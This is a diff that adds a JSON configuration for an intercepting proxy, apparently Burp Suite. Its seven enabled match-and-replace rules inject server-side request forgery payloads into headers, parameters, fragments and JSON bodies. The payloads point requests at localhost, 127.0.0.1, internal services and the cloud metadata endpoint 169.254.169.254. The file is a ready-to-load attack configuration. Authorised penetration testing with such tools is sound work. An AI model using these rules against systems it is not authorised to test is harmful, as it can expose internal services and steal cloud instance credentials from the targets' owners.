@@ -1,0 +1,62 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "SSRF payload in Referer header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "Referer: ",
+                "string_replace": "Referer: http://127.0.0.1:80"
+            },
+            {
+                "comment": "SSRF payload in User-Agent header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "User-Agent: ",
+                "string_replace": "User-Agent: http://169.254.169.254/latest/meta-data/"
+            },
+            {
+                "comment": "SSRF payload in Cookie header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "Cookie: ",
+                "string_replace": "Cookie: ssrf=http://localhost/admin"
+            },
+            {
+                "comment": "SSRF payload in query parameter values",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "=.*",
+                "string_replace": "=http://127.0.0.1:8080"
+            },
+            {
+                "comment": "SSRF payload in URL fragments",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_uri",
+                "string_match": "#",
+                "string_replace": "#http://internal-service"
+            },
+            {
+                "comment": "SSRF payload in JSON body",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "\".*\":.*",
+                "string_replace": "\"ssrf_payload\":\"http://169.254.169.254/latest/meta-data/\""
+            },
+            {
+                "comment": "SSRF payload in POST parameter values",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "=.*",
+                "string_replace": "=http://localhost:8080"
+            }
+        ]
+    }
+}
